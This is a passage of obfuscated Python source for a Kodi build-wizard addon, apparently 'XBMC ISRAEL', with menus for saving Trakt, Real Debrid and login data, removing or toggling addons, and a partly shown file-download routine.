	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%OO0O0O00O0000O0OO .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3132
	addFile ('%s שמירת פליליסט לאודר:  '%O0O0OO0000O0OO00O .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3133
	addFile ('%s שמירת הגדרות באפר: '%O00000O000000O000 .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3138
	addFile ('%s שמירת רשימות ריפו:  '%OOO0OOO00O000OO0O .replace ('true',OOOO000OO000O00OO ).replace ('false',OOO00O0O00OO0000O ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3140
	setView ('files','viewType')#line:3142
def traktMenu ():#line:3144
	OO0OO0O0OO000OO00 ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3145
	O00OOO0OO00OOOOOO =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3146
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3147
	addFile ('Save Trakt Data: %s'%OO0OO0O0OO000OO00 ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3148
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O00OOO0OO00OOOOOO ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3149
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3150
	for OO0OO0O0OO000OO00 in traktit .ORDER :#line:3152
		O00OO000000000O0O =TRAKTID [OO0OO0O0OO000OO00 ]['name']#line:3153
		O0OOOO0000OO0000O =TRAKTID [OO0OO0O0OO000OO00 ]['path']#line:3154
		OO0O00OO0O00OOO00 =TRAKTID [OO0OO0O0OO000OO00 ]['saved']#line:3155
		O00OOO00O0O0O0000 =TRAKTID [OO0OO0O0OO000OO00 ]['file']#line:3156
		O0O00OOO00OO00O00 =wiz .getS (OO0O00OO0O00OOO00 )#line:3157
		OO0O0OOO0O00OO00O =traktit .traktUser (OO0OO0O0OO000OO00 )#line:3158
		OO000O0000O00O00O =TRAKTID [OO0OO0O0OO000OO00 ]['icon']if os .path .exists (O0OOOO0000OO0000O )else ICONTRAKT #line:3159
		O0OO0OOOOOOOOO0O0 =TRAKTID [OO0OO0O0OO000OO00 ]['fanart']if os .path .exists (O0OOOO0000OO0000O )else FANART #line:3160
		O00000OO00OO0OOOO =createMenu ('saveaddon','Trakt',OO0OO0O0OO000OO00 )#line:3161
		OOOOO0000O0O0O0O0 =createMenu ('save','Trakt',OO0OO0O0OO000OO00 )#line:3162
		O00000OO00OO0OOOO .append ((THEME2 %'%s Settings'%O00OO000000000O0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,OO0OO0O0OO000OO00 )))#line:3163
		addFile ('[+]-> %s'%O00OO000000000O0O ,'',icon =OO000O0000O00O00O ,fanart =O0OO0OOOOOOOOO0O0 ,themeit =THEME3 )#line:3165
		if not os .path .exists (O0OOOO0000OO0000O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO000O0000O00O00O ,fanart =O0OO0OOOOOOOOO0O0 ,menu =O00000OO00OO0OOOO )#line:3166
		elif not OO0O0OOO0O00OO00O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',OO0OO0O0OO000OO00 ,icon =OO000O0000O00O00O ,fanart =O0OO0OOOOOOOOO0O0 ,menu =O00000OO00OO0OOOO )#line:3167
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0O0OOO0O00OO00O ,'authtrakt',OO0OO0O0OO000OO00 ,icon =OO000O0000O00O00O ,fanart =O0OO0OOOOOOOOO0O0 ,menu =O00000OO00OO0OOOO )#line:3168
		if O0O00OOO00OO00O00 =="":#line:3169
			if os .path .exists (O00OOO00O0O0O0000 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',OO0OO0O0OO000OO00 ,icon =OO000O0000O00O00O ,fanart =O0OO0OOOOOOOOO0O0 ,menu =OOOOO0000O0O0O0O0 )#line:3170
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',OO0OO0O0OO000OO00 ,icon =OO000O0000O00O00O ,fanart =O0OO0OOOOOOOOO0O0 ,menu =OOOOO0000O0O0O0O0 )#line:3171
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O00OOO00OO00O00 ,'',icon =OO000O0000O00O00O ,fanart =O0OO0OOOOOOOOO0O0 ,menu =OOOOO0000O0O0O0O0 )#line:3172
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3174
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3175
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3176
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3177
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3178
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3179
	setView ('files','viewType')#line:3180
def realMenu ():#line:3182
	O0OO0OOO000000000 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3183
	O000000OO00O00O0O =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3184
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3185
	addFile ('Save Real Debrid Data: %s'%O0OO0OOO000000000 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3186
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O000000OO00O00O0O ),'',icon =ICONREAL ,themeit =THEME3 )#line:3187
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3188
	for O00O0OOOOOO000OO0 in debridit .ORDER :#line:3190
		O000O00OOO00O0OOO =DEBRIDID [O00O0OOOOOO000OO0 ]['name']#line:3191
		O000O0O0O00OO00O0 =DEBRIDID [O00O0OOOOOO000OO0 ]['path']#line:3192
		OOO000O0OO0OOO000 =DEBRIDID [O00O0OOOOOO000OO0 ]['saved']#line:3193
		O0OO0O0O00O0OO00O =DEBRIDID [O00O0OOOOOO000OO0 ]['file']#line:3194
		OO0OO0O0OOO0OOO00 =wiz .getS (OOO000O0OO0OOO000 )#line:3195
		O00O0O0O000O0000O =debridit .debridUser (O00O0OOOOOO000OO0 )#line:3196
		OO0OO00O0O00O0OOO =DEBRIDID [O00O0OOOOOO000OO0 ]['icon']if os .path .exists (O000O0O0O00OO00O0 )else ICONREAL #line:3197
		OO00O0OOOO0O00000 =DEBRIDID [O00O0OOOOOO000OO0 ]['fanart']if os .path .exists (O000O0O0O00OO00O0 )else FANART #line:3198
		OOO000O00OO000OOO =createMenu ('saveaddon','Debrid',O00O0OOOOOO000OO0 )#line:3199
		O0OO0OOO000OO00OO =createMenu ('save','Debrid',O00O0OOOOOO000OO0 )#line:3200
		OOO000O00OO000OOO .append ((THEME2 %'%s Settings'%O000O00OOO00O0OOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,O00O0OOOOOO000OO0 )))#line:3201
		addFile ('[+]-> %s'%O000O00OOO00O0OOO ,'',icon =OO0OO00O0O00O0OOO ,fanart =OO00O0OOOO0O00000 ,themeit =THEME3 )#line:3203
		if not os .path .exists (O000O0O0O00OO00O0 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0OO00O0O00O0OOO ,fanart =OO00O0OOOO0O00000 ,menu =OOO000O00OO000OOO )#line:3204
		elif not O00O0O0O000O0000O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',O00O0OOOOOO000OO0 ,icon =OO0OO00O0O00O0OOO ,fanart =OO00O0OOOO0O00000 ,menu =OOO000O00OO000OOO )#line:3205
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O00O0O0O000O0000O ,'authdebrid',O00O0OOOOOO000OO0 ,icon =OO0OO00O0O00O0OOO ,fanart =OO00O0OOOO0O00000 ,menu =OOO000O00OO000OOO )#line:3206
		if OO0OO0O0OOO0OOO00 =="":#line:3207
			if os .path .exists (O0OO0O0O00O0OO00O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',O00O0OOOOOO000OO0 ,icon =OO0OO00O0O00O0OOO ,fanart =OO00O0OOOO0O00000 ,menu =O0OO0OOO000OO00OO )#line:3208
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',O00O0OOOOOO000OO0 ,icon =OO0OO00O0O00O0OOO ,fanart =OO00O0OOOO0O00000 ,menu =O0OO0OOO000OO00OO )#line:3209
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0OO0O0OOO0OOO00 ,'',icon =OO0OO00O0O00O0OOO ,fanart =OO00O0OOOO0O00000 ,menu =O0OO0OOO000OO00OO )#line:3210
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3212
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3213
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3214
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3215
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3216
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3217
	setView ('files','viewType')#line:3218
def loginMenu ():#line:3220
	OOOOO0O0OOOOOOO0O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3221
	OOOOO0OO0OO0000O0 =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3222
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3223
	addFile ('Save Login Data: %s'%OOOOO0O0OOOOOOO0O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3224
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (OOOOO0OO0OO0000O0 ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3225
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3226
	for OOOOO0O0OOOOOOO0O in loginit .ORDER :#line:3228
		OOO00OOO0OOOO00O0 =LOGINID [OOOOO0O0OOOOOOO0O ]['name']#line:3229
		OOOOOO00O00O00O0O =LOGINID [OOOOO0O0OOOOOOO0O ]['path']#line:3230
		OOOOO000000O0000O =LOGINID [OOOOO0O0OOOOOOO0O ]['saved']#line:3231
		OOOO00000OOO000O0 =LOGINID [OOOOO0O0OOOOOOO0O ]['file']#line:3232
		O00O0OO0O0OO00000 =wiz .getS (OOOOO000000O0000O )#line:3233
		OO0OOOO00O00OOO00 =loginit .loginUser (OOOOO0O0OOOOOOO0O )#line:3234
		OOO0OOOOO0O000OOO =LOGINID [OOOOO0O0OOOOOOO0O ]['icon']if os .path .exists (OOOOOO00O00O00O0O )else ICONLOGIN #line:3235
		OO00O0O000O0O00OO =LOGINID [OOOOO0O0OOOOOOO0O ]['fanart']if os .path .exists (OOOOOO00O00O00O0O )else FANART #line:3236
		OOOOO00OOOOOO000O =createMenu ('saveaddon','Login',OOOOO0O0OOOOOOO0O )#line:3237
		OO0000O0OO00000OO =createMenu ('save','Login',OOOOO0O0OOOOOOO0O )#line:3238
		OOOOO00OOOOOO000O .append ((THEME2 %'%s Settings'%OOO00OOO0OOOO00O0 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOOOO0O0OOOOOOO0O )))#line:3239
		addFile ('[+]-> %s'%OOO00OOO0OOOO00O0 ,'',icon =OOO0OOOOO0O000OOO ,fanart =OO00O0O000O0O00OO ,themeit =THEME3 )#line:3241
		if not os .path .exists (OOOOOO00O00O00O0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO0OOOOO0O000OOO ,fanart =OO00O0O000O0O00OO ,menu =OOOOO00OOOOOO000O )#line:3242
		elif not OO0OOOO00O00OOO00 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOOOO0O0OOOOOOO0O ,icon =OOO0OOOOO0O000OOO ,fanart =OO00O0O000O0O00OO ,menu =OOOOO00OOOOOO000O )#line:3243
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OO0OOOO00O00OOO00 ,'authlogin',OOOOO0O0OOOOOOO0O ,icon =OOO0OOOOO0O000OOO ,fanart =OO00O0O000O0O00OO ,menu =OOOOO00OOOOOO000O )#line:3244
		if O00O0OO0O0OO00000 =="":#line:3245
			if os .path .exists (OOOO00000OOO000O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOOOO0O0OOOOOOO0O ,icon =OOO0OOOOO0O000OOO ,fanart =OO00O0O000O0O00OO ,menu =OO0000O0OO00000OO )#line:3246
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOOOO0O0OOOOOOO0O ,icon =OOO0OOOOO0O000OOO ,fanart =OO00O0O000O0O00OO ,menu =OO0000O0OO00000OO )#line:3247
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00O0OO0O0OO00000 ,'',icon =OOO0OOOOO0O000OOO ,fanart =OO00O0O000O0O00OO ,menu =OO0000O0OO00000OO )#line:3248
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3250
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3251
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3252
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3253
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3254
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3255
	setView ('files','viewType')#line:3256
def fixUpdate ():#line:3258
	if KODIV <17 :#line:3259
		OO00OO0OO0O0O0O00 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3260
		try :#line:3261
			os .remove (OO00OO0OO0O0O0O00 )#line:3262
		except Exception as OO0OOOOO000OOO000 :#line:3263
			wiz .log ("Unable to remove %s, Purging DB"%OO00OO0OO0O0O0O00 )#line:3264
			wiz .purgeDb (OO00OO0OO0O0O0O00 )#line:3265
	else :#line:3266
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3267
def removeAddonMenu ():#line:3269
	O0O0O0O0OO000OOO0 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3270
	OO00O00O00OO0O0O0 =[];OO0O0O000OO0O0000 =[]#line:3271
	for O00OOOOO0OO000O00 in sorted (O0O0O0O0OO000OOO0 ,key =lambda O0000OOOOOO0OO0O0 :O0000OOOOOO0OO0O0 ):#line:3272
		OOO0OOO0OOOOO000O =os .path .split (O00OOOOO0OO000O00 [:-1 ])[1 ]#line:3273
		if OOO0OOO0OOOOO000O in EXCLUDES :continue #line:3274
		elif OOO0OOO0OOOOO000O in DEFAULTPLUGINS :continue #line:3275
		elif OOO0OOO0OOOOO000O =='packages':continue #line:3276
		OOO00O0O00O0O0OO0 =os .path .join (O00OOOOO0OO000O00 ,'addon.xml')#line:3277
		if os .path .exists (OOO00O0O00O0O0OO0 ):#line:3278
			O0O000O0O0OO0OO0O =open (OOO00O0O00O0O0OO0 )#line:3279
			OOOO00000O0O000OO =O0O000O0O0OO0OO0O .read ()#line:3280
			O0OOOOOO00OO00OOO =wiz .parseDOM (OOOO00000O0O000OO ,'addon',ret ='id')#line:3281
			OO0OOOO0OOOOOO0OO =OOO0OOO0OOOOO000O if len (O0OOOOOO00OO00OOO )==0 else O0OOOOOO00OO00OOO [0 ]#line:3283
			try :#line:3284
				OO0O0O0O0OO0000OO =xbmcaddon .Addon (id =OO0OOOO0OOOOOO0OO )#line:3285
				OO00O00O00OO0O0O0 .append (OO0O0O0O0OO0000OO .getAddonInfo ('name'))#line:3286
				OO0O0O000OO0O0000 .append (OO0OOOO0OOOOOO0OO )#line:3287
			except :#line:3288
				pass #line:3289
	if len (OO00O00O00OO0O0O0 )==0 :#line:3290
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3291
		return #line:3292
	if KODIV >16 :#line:3293
		O0OOO0OOO0O0OO00O =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO00O00O00OO0O0O0 )#line:3294
	else :#line:3295
		O0OOO0OOO0O0OO00O =[];OOO000OO0OOO0O0O0 =0 #line:3296
		OOO00O0000O0O0O0O =["-- Click here to Continue --"]+OO00O00O00OO0O0O0 #line:3297
		while not OOO000OO0OOO0O0O0 ==-1 :#line:3298
			OOO000OO0OOO0O0O0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,OOO00O0000O0O0O0O )#line:3299
			if OOO000OO0OOO0O0O0 ==-1 :break #line:3300
			elif OOO000OO0OOO0O0O0 ==0 :break #line:3301
			else :#line:3302
				OOO0OOO0O0O00O000 =(OOO000OO0OOO0O0O0 -1 )#line:3303
				if OOO0OOO0O0O00O000 in O0OOO0OOO0O0OO00O :#line:3304
					O0OOO0OOO0O0OO00O .remove (OOO0OOO0O0O00O000 )#line:3305
					OOO00O0000O0O0O0O [OOO000OO0OOO0O0O0 ]=OO00O00O00OO0O0O0 [OOO0OOO0O0O00O000 ]#line:3306
				else :#line:3307
					O0OOO0OOO0O0OO00O .append (OOO0OOO0O0O00O000 )#line:3308
					OOO00O0000O0O0O0O [OOO000OO0OOO0O0O0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO00O00O00OO0O0O0 [OOO0OOO0O0O00O000 ])#line:3309
	if O0OOO0OOO0O0OO00O ==None :return #line:3310
	if len (O0OOO0OOO0O0OO00O )>0 :#line:3311
		wiz .addonUpdates ('set')#line:3312
		for OOO00OO00O000O0OO in O0OOO0OOO0O0OO00O :#line:3313
			removeAddon (OO0O0O000OO0O0000 [OOO00OO00O000O0OO ],OO00O00O00OO0O0O0 [OOO00OO00O000O0OO ],True )#line:3314
		xbmc .sleep (1000 )#line:3316
		if INSTALLMETHOD ==1 :O000O00O00O000O0O =1 #line:3318
		elif INSTALLMETHOD ==2 :O000O00O00O000O0O =0 #line:3319
		else :O000O00O00O000O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3320
		if O000O00O00O000O0O ==1 :wiz .reloadFix ('remove addon')#line:3321
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3322
def removeAddonDataMenu ():#line:3324
	if os .path .exists (ADDOND ):#line:3325
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3326
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3327
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3328
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3329
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3330
		O00OOO0O0OOO00O0O =glob .glob (os .path .join (ADDOND ,'*/'))#line:3331
		for OO0O0OOOO00O0OO00 in sorted (O00OOO0O0OOO00O0O ,key =lambda OO0O0OO0OOO0O0000 :OO0O0OO0OOO0O0000 ):#line:3332
			O000OO00O0000O00O =OO0O0OOOO00O0OO00 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3333
			O00OO00O0O0OOO000 =os .path .join (OO0O0OOOO00O0OO00 .replace (ADDOND ,ADDONS ),'icon.png')#line:3334
			O0O0OO0OOO00OOO00 =os .path .join (OO0O0OOOO00O0OO00 .replace (ADDOND ,ADDONS ),'fanart.png')#line:3335
			OO0000O000O0OO00O =O000OO00O0000O00O #line:3336
			O0OOO0O0O00000OOO ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3337
			for O0OO0O000000OO000 in O0OOO0O0O00000OOO :#line:3338
				OO0000O000O0OO00O =OO0000O000O0OO00O .replace (O0OO0O000000OO000 ,O0OOO0O0O00000OOO [O0OO0O000000OO000 ])#line:3339
			if O000OO00O0000O00O in EXCLUDES :OO0000O000O0OO00O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO0000O000O0OO00O #line:3340
			else :OO0000O000O0OO00O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO0000O000O0OO00O #line:3341
			addFile (' %s'%OO0000O000O0OO00O ,'removedata',O000OO00O0000O00O ,icon =O00OO00O0O0OOO000 ,fanart =O0O0OO0OOO00OOO00 ,themeit =THEME2 )#line:3342
	else :#line:3343
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3344
	setView ('files','viewType')#line:3345
def enableAddons ():#line:3347
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3348
	OOOOO000000O0O00O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3349
	O0OOOO000O0OO0OO0 =0 #line:3350
	for O0OO00O0OOOO00000 in sorted (OOOOO000000O0O00O ,key =lambda OO00OOO0OOO000O00 :OO00OOO0OOO000O00 ):#line:3351
		OOO0O00OOOOO0OOOO =os .path .split (O0OO00O0OOOO00000 [:-1 ])[1 ]#line:3352
		if OOO0O00OOOOO0OOOO in EXCLUDES :continue #line:3353
		if OOO0O00OOOOO0OOOO in DEFAULTPLUGINS :continue #line:3354
		OOO0OOO0000O000OO =os .path .join (O0OO00O0OOOO00000 ,'addon.xml')#line:3355
		if os .path .exists (OOO0OOO0000O000OO ):#line:3356
			O0OOOO000O0OO0OO0 +=1 #line:3357
			OOOOO000000O0O00O =O0OO00O0OOOO00000 .replace (ADDONS ,'')[1 :-1 ]#line:3358
			O00OOO0O0OO00O00O =open (OOO0OOO0000O000OO )#line:3359
			O0O00OOO000OO0000 =O00OOO0O0OO00O00O .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3360
			O0OOOO0O000OO0000 =wiz .parseDOM (O0O00OOO000OO0000 ,'addon',ret ='id')#line:3361
			O0OO00000000OO0OO =wiz .parseDOM (O0O00OOO000OO0000 ,'addon',ret ='name')#line:3362
			try :#line:3363
				O00O00OOOOO0OOOO0 =O0OOOO0O000OO0000 [0 ]#line:3364
				O0OO0O000OOO0OO0O =O0OO00000000OO0OO [0 ]#line:3365
			except :#line:3366
				continue #line:3367
			try :#line:3368
				OO000OO0OO000OOO0 =xbmcaddon .Addon (id =O00O00OOOOO0OOOO0 )#line:3369
				OO0OO00OOO00O0O00 ="[COLOR green][Enabled][/COLOR]"#line:3370
				O00O0O00O0OO0OOO0 ="false"#line:3371
			except :#line:3372
				OO0OO00OOO00O0O00 ="[COLOR red][Disabled][/COLOR]"#line:3373
				O00O0O00O0OO0OOO0 ="true"#line:3374
				pass #line:3375
			OO000OOO00O0OO0O0 =os .path .join (O0OO00O0OOOO00000 ,'icon.png')if os .path .exists (os .path .join (O0OO00O0OOOO00000 ,'icon.png'))else ICON #line:3376
			O0O0OOOO00O0OO00O =os .path .join (O0OO00O0OOOO00000 ,'fanart.jpg')if os .path .exists (os .path .join (O0OO00O0OOOO00000 ,'fanart.jpg'))else FANART #line:3377
			addFile ("%s %s"%(OO0OO00OOO00O0O00 ,O0OO0O000OOO0OO0O ),'toggleaddon',OOOOO000000O0O00O ,O00O0O00O0OO0OOO0 ,icon =OO000OOO00O0OO0O0 ,fanart =O0O0OOOO00O0OO00O )#line:3378
			O00OOO0O0OO00O00O .close ()#line:3379
	if O0OOOO000O0OO0OO0 ==0 :#line:3380
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3381
	setView ('files','viewType')#line:3382
def changeFeq ():#line:3384
	OOOO000OOO0O00O00 =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3385
	O000000OO0OOO000O =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOOO000OOO0O00O00 )#line:3386
	if not O000000OO0OOO000O ==-1 :#line:3387
		wiz .setS ('autocleanfeq',str (O000000OO0OOO000O ))#line:3388
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOOO000OOO0O00O00 [O000000OO0OOO000O ]))#line:3389
def developer ():#line:3391
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3392
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3393
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3394
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3395
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3396
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3397
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3398
	setView ('files','viewType')#line:3400
def download (OOO0O0O000OOOO0OO ,OOOO0OOO0O0OO0O0O ):#line:3405
  OO0O0O00O0OO00OO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3406
  OO0O00OOOOOOO0OO0 =xbmcgui .DialogProgress ()#line:3407
  OO0O00OOOOOOO0OO0 .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3408
  O0OOOOO00OO00OO0O =os .path .join (OO0O0O00O0OO00OO0 ,'isr.zip')#line:3409
  OO0O0OOO0OOOOOOOO =urllib2 .Request (OOO0O0O000OOOO0OO )#line:3410
  O000O00O0OO0OOO0O =urllib2 .urlopen (OO0O0OOO0OOOOOOOO )#line:3411
  OOO0O0OOO0O00O00O =xbmcgui .DialogProgress ()#line:3413
  OOO0O0OOO0O00O00O .create ("Downloading","Downloading "+name )#line:3414
  OOO0O0OOO0O00O00O .update (0 )#line:3415
  OO00O00OO000000OO =OOOO0OOO0O0OO0O0O #line:3416
  OOOO000O0O000O00O =open (O0OOOOO00OO00OO0O ,'wb')#line:3417
  try :#line:3419
    O0O0000O0O0000OO0 =O000O00O0OO0OOO0O .info ().getheader ('Content-Length').strip ()#line:3420
    OOOO000OOOO00000O =True #line:3421
  except AttributeError :#line:3422
        OOOO000OOOO00000O =False #line:3423
  if OOOO000OOOO00000O :#line:3425
        O0O0000O0O0000OO0 =int (O0O0000O0O0000OO0 )#line:3426
  O0000O0000O0000O0 =0 #line:3428
  OOO0OO0O00O000O0O =time .time ()#line:3429
  while True :#line:3430
        O000000OOOOO0OOO0 =O000O00O0OO0OOO0O .read (8192 )#line:3431
        if not O000000OOOOO0OOO0 :#line:3432
            sys .stdout .write ('\n')#line:3433
            break #line:3434
        O0000O0000O0000O0 +=len (O000000OOOOO0OOO0 )#line:3436
        OOOO000O0O000O00O .write (O000000OOOOO0OOO0 )#line:3437
        if not OOOO000OOOO00000O :#line:3439
            O0O0000O0O0000OO0 =O0000O0000O0000O0 #line:3440
        if OOO0O0OOO0O00O00O .iscanceled ():#line:3441
           OOO0O0OOO0O00O00O .close ()#line:3442
           try :#line:3443
            os .remove (O0OOOOO00OO00OO0O )#line:3444
           except :#line:3445
            pass #line:3446
           break #line:3447
        O0OOO000O0OO0O000 =float (O0000O0000O0000O0 )/O0O0000O0O0000OO0 #line:3448
        O0OOO000O0OO0O000 =round (O0OOO000O0OO0O000 *100 ,2 )#line:3449
        O0O00O00OOOO00OO0 =O0000O0000O0000O0 /(1024 *1024 )#line:3450
        O000OO0OO00O0OO00 =O0O0000O0O0000OO0 /(1024 *1024 )#line:3451
